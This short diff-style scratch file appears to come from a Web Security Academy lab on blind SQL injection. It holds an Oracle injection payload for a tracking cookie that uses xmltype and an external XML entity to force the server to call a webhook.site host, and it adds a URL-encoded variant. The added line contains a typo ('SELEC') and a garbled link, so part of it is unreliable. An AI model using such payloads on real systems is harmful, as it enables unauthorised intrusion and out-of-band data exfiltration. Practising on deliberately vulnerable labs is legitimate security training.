@@ -1,6 +1,6 @@
 https://0a9b00db03ed7a5380b13fb500900083.web-security-academy.net/
 rackingId=x'||(SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://webhook.site/399ae2f3-a94a-4c94-8507-d2e2ed0f4c7a"> %remote;]>'),'/l') FROM dual)||''
-
+' || (SELEC EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"[http%3a//BURP-COLLABORATOR-SUBDOMAIN](https://webhook.site/399ae2f3-a94a-4c94-8507-d2e2ed0f4c7a)/">+%25remote%3b]>'),'/l')+FROM+dual--
 
 GET / HTTP/2
 Host: 0a9b00db03ed7a5380b13fb500900083.web-security-academy.net
